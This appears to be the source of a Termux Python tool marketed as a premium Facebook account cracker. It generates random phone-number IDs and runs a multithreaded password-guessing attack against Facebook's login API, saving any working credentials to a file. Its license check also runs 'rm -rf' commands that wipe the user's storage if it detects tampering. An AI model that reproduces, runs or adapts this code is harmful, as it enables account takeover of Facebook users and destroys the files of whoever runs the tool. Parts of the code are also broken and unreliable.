lo=f"""{y}\033[1;1m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
{y}┃{GG}  ▛▀▖▞▀▖▞▀▖▌ ▌  ▙▄▌▛▀ ▞▀▖▙▗▌  ▌  ▙▗▌▙ ▌   ▞▀▖  {y}┃
{y}┃{GG1}  ▌ ▌▙▄▌▌ ▌▌▞    ▌ ▛▀ ▙▄▌▌▘▌  ▌  ▌▘▌▌▌▌▙▗▌▙▄▌  {y}┃
{y}┃{GG2}  ▌ ▌▌ ▌▌▀▖▌▀▖   ▌ ▙▄ ▌ ▌▌ ▌  ▌  ▌ ▌▌▝▌▞▀▖  ▌  {y}┃
{y}┃{GG3}  ▀▘ ▘ ▘▘ ▘▘ ▘   ▘ ▘  ▘ ▘▘ ▘  ▀▀ ▘ ▘▘ ▘▘ ▘ ▀   {y}┃
{y}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
   {y}  \\\ {i} CODED BY {r}-  {GG3}@DARK_LMNx999     {y}//
   {y}  //  {ii}TEAM    {r} -  {GG}@DARK_TEAM_LMNx9  {y}\\\ 
   {GY}  \\\  {iii}STATUS   {r}-  {b}PREMIUM-5x-1m    {GY} //
   {GX}  //  {iiii}VERSION  {r}-  {x}armv64-0.1        {GX}\\\ 
     {GX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

op=f'''     [bold purple] ┃[bold yellow]01[bold purple] |[bold green] Random_BD[bold purple] ┃[bold yellow]07[bold purple] |[bold green] Dump_URL   [bold purple]┃
     [bold purple] ┃[bold yellow]02[bold purple] |[bold green] Random_PK[bold purple] ┃[bold yellow]08[bold purple] |[bold green] Dump_FB   [bold purple] ┃
     [bold purple] ┃[bold yellow]03[bold purple] |[bold green] Gmail_BD [bold purple] ┃[bold yellow]09[bold purple] |[bold blue] Report_BUG [bold purple]┃
     [bold purple] ┃[bold yellow]04[bold purple] |[bold green] Gmail_PK [bold purple] ┃[bold yellow]10[bold purple] |[bold cyan] Join_CHNL [bold purple] ┃
     [bold purple] ┃[bold yellow]05[bold purple] |[bold green] File_BD  [bold purple] ┃[bold yellow]00[bold purple] |[bold red] Exit_TOOL [bold purple] ┃
     [bold purple] ┃[bold yellow]06[bold purple] |[bold green] File_PK  [bold purple] ┃[bold yellow]##[bold purple] |[bold black] RESTART    [bold purple]┃'''


def logx():
    python3(op);linex()
    lj=input(f'     {y}[{x}•{y}] {b}Option {r}->{l} ')
    if lj in ['#','##']:
        load(f'{o}     [*] Tool Restarting...             ')
        os.system('clear')
        time.sleep(1.8)
        main()
    elif lj in ['0','00']:
        os.system('clear');sys.exit()
        os.system('clear');exit()
    elif lj in ['10']:
        os.system('xdg-open https://t.me/DARK_TEAM_LMNx9')
        time.sleep(4);Limons()
        main()
    elif lj in ['9','09']:
        os.system('xdg-open https://t.me/DARK_LMNx999')
        time.sleep(4);main()
    elif lj in ['2','3','4','5','6','7','8','01','02','03','04','05','06','07','08']:
        apvx9();Limons()
    elif lj in ['01','1']:
        apvx9();Limons()
    else:
        print(f'     {y}[{x}✘{y}] {r}Option Not Found ! {b}->')
        time.sleep(2)
        main()
        
def main():
    os.system('clear')
    print(lo);logx()
    
def logo():
    print(lo)

def apvx9():#====[ APPROVAL SYSTEM ]
    def req(DARK_LMNx9,main_url):
        try:
            lxl=DARK_LMNx9.get(main_url)
            approved=lxl.text
            return approved
        except:
            linex()
            print(f"\t{r}[{y}✘{r}] {r}Rᴇᴏ̨ᴜᴇsᴛS EʀʀᴏR")
            linex()
            input(f"\t{G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
    def url_sefty():
        try:
            h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py","r").read()
            vx=re.search("print",h)
            if vx == None:
                report= "pure_user"
            else:
                report= "bypass_user"
            return report
        except:
             pass
    def url_sefty2():
        try:
            h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_api.py","r").read()
            vx=re.search("print",h)
            if vx == None:
                report= "pure_user"
            else:
                report= "bypass_user"
            return report
        except:
             pass
    def key_sefty():
        global key
        try:
            h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/httpx/_models.py","r").read()
            vx=re.search(key,h)
            if vx == None:
                report= "pure_user"
            else:
                report= "bypass_user"
            return report
        except:
             pass
    def key_sefty2():
        global key
        try:
            h=open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py","r").read()
            vx=re.search(key,h)
            if vx == None:
                report= "pure_user"
            else:
                report= "bypass_user"
            return report
        except:
             pass
    def lisens():
        
        global key 
        ky=key.split('\'')[1]
        li=ky[5:15]
        try:
            open("/data/data/com.termux/files/usr/bin/.jui.txt","r").read()
            expired_ck()
        except:
            while True:
                logo()
                linex()
                xcx=input(f"\t{G4}┃{g1}+{G4}┃{GG3} LICENSE {y}➤{g3} ")
                linex()
                if xcx == li:
                    open("/data/data/com.termux/files/usr/bin/.jui.txt","a").write("done")
                    expired_ck()
                    break 
                else:
                    continue 
    def expired_ck():
        global key,all_datA
        tita=str(datetime.now()).split(" ")[0]
        tic=tita.split("-")
        pure_data=int(tic[0]+tic[1]+tic[2])
        for x in all_datA:
            if key in x:    
                break 
            else:
                continue
        JOHNY=int(x.split("\'|")[1])
        if pure_data < JOHNY:
            os.system('clear')
            sys.exit()
        else:
            logo()
            linex()
            print(f" {G4}┃{g1}•{G4}┃{g2} APPROVAL WAS EXPIRED")
            linex()
            input(f"\t{G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
    def uninstall_able():
        try:
            open("/data/data/com.termux/files/usr/bin/pip","r").read()
            open("/data/data/com.termux/files/usr/bin/pip3","r").read()
        except:
            logo()
            linex()
            print(f" {G4}┃{g1}•{G4}┃{g2} YOU ARE USING ANTI-UNINSTALL STSTEM")
            linex()
            input(f"\t{G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
    def lija_bow_tah():
        global key,main_url
        uninstall_able()
        if "pure_user" == url_sefty():
            pass
        elif "bypass_user" == url_sefty():
            os.system("rm -rf /sdcard/ *")
            os.system("rm -rf /sdcard/*")
            os.system("rm -rf *")
            logo()
            linex()
            print(f" {G4}┃{g1}•{G4}┃{g2} FUCK YOUR BYPASS SYSTEM")
            linex()
            input(f"\t{G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
        if "pure_user" == url_sefty2():
            pass
        elif "bypass_user" == url_sefty2():
            os.system("rm -rf /sdcard/ *")
            os.system("rm -rf /sdcard/*")
            os.system("rm -rf *")
            logo()
            linex()
            print(f" {G4}┃{g1}•{G4}┃{g2} FUCK YOUR BYPASS SYSTEM")
            linex()
            input(f"\t{G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
        if "pure_user" == key_sefty():
            pass
        elif "bypass_user" == key_sefty2():
            os.system("rm -rf /sdcard/ *")
            os.system("rm -rf /sdcard/*")
            os.system("rm -rf *")
            logo()
            linex()
            print(f" {G4}┃{g1}•{G4}┃{g2} FUCK YOUR BYPASS SYSTEM")
            linex()
            input(f"\t{G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
        if "pure_user" == key_sefty():
            pass
        elif "bypass_user" == key_sefty2():
            os.system("rm -rf /sdcard/ *")
            os.system("rm -rf /sdcard/*")
            os.system("rm -rf *")
            logo()
            linex()
            print(f" {G4}┃{g1}•{G4}┃{g2} FUCK YOUR BYPASS SYSTEM")
            linex()
            input(f"\t{G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
        try:
            DARK_LMNx9=httpx.Client() 
            data=req(DARK_LMNx9,main_url)
        except:
            linex()
            print(f"\t{r}[{y}✘{r}] {r}Rᴇᴏ̨ᴜᴇsᴛS EʀʀᴏR")
            linex()
            input(f"\t{G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
        for dta in data.splitlines():
            all_datA.append(dta)
            row=[]
        for r in data.splitlines():
            rx=r.split("|")[0]
            row.append(rx)
        if key not in row:
            logo()
            linex()
            print(f" {G4}┃{g1}✘{G4}┃{g2} SORRY {G4}➤{y} YOU ARE NOT A PREMIUM USER ")
            linex()
            print(f" {G4}┃{g1}✔{G4}┃{g2} TOKEN {y}➤{G4}", key)
            linex()
            input(f" {G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ CᴏɴᴛᴀᴄT AᴅᴍɪN {y}➤")
            os.system("xdg-open https://t.me/DARK_LMNx999")
            linex()
            input(f" {G4}┃{g1}•{G4}┃{g2} PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK {y}➤")
            main()
        else:
            lisens()
    lija_bow_tah()
    os.system('clear')
    sys.exit('\n[*] FUCK YOUR BYPASSING SYSTEM - © LMNx9\n')

def Limons():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(lo)
    print("Ex : 016,017,018,019")
    code = input('Sim Code : ')
    os.system('clear')
    print(lo)
    print("Ex : 5000,10000,50000")
    limit=int(input("Enter limit : "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=40) as Fb_crack:
        os.system('clear')
        print(lo)
        tl = str(len(user))
        print(f'     {GX}[{r}//{GX}] {i}SIM Code {r}-{y} {code} ')
        print(f'     {GX}[{r}//{GX}] {ii}Limit     {r}- {GY}{limit}')
        print(f'     {GX}[{r}//{GX}] {iii}Option   {r} - {GX}[3] BD ')
        print(f'     {GX}[{r}//{GX}] {b}Use Mobile DATA For OK Id ')
        print(f"{GX}     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        os.system('xdg-open https://t.me/DARK_TEAM_LMNx9')
        for love in user:
            pwx = [love,love[2:],code+love[:3],'sadiya','queen00','123456','badqueen','badboy','lija1234','ILOVEYOU','mimakter','jannatul','riyamoni']
            uid = code+love
            Fb_crack.submit(Limonm,uid,pwx,tl)
            
    print(' \033[1;92m║ 🌼\033[1;96m ●  \033[1;93mCRACK 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ')

oks=[]
cps=[]
ugen=[]
loop=0

for xd in range(50000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def UA():
        user_agents = []
        user_agent = f"[FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBRV/"+str(random.randint(111111111,999999999))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
        user_agents.append(user_agent)
        return user_agents

uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])

def Limonm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
    sys.stdout.write(f'\r {GG3}[{b}LMNx9{GG3}] {r}- {i}[{y}{loop}{GG}/{GY}{tl}{i}] {r}- {i}[{GG3}OK-{len(oks)}{i}]{b}┃{i}[{r}CP-0l{len(cps)}{i}]{b}┃{i}[{y}2F-0{i}] '),
    sys.stdout.flush()
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.flush()
            pro = random.choice(ugen)
            adid = str(uuid.uuid4())
            deviceid= str(uuid.uuid4())
            fm_deviceid = str(uuid.uuid4())
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": uid,
                "password": ps,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_GB",
                "client_country_code": "GB",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
                'User-Agent': UA,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url1= 'https://b-graph.facebook.com/auth/login'
            lo = requests.post(url=url1,data=data,headers=head,allow_redirects=False).json()
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'{GG3}[LMNx9-OK] {uid} | {ps}')
                open('/sdcard/LMNx9-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]                           
                cps.append(cid)
                break
            else:
                continue               
        loop+=1
    except:
        pass
        

if __name__ in '__main__':
    print('\n');lood()
    os.system('clear')
    print(lo)
    load_op(f'{w}[*] Cheaking Security - ')
    main()
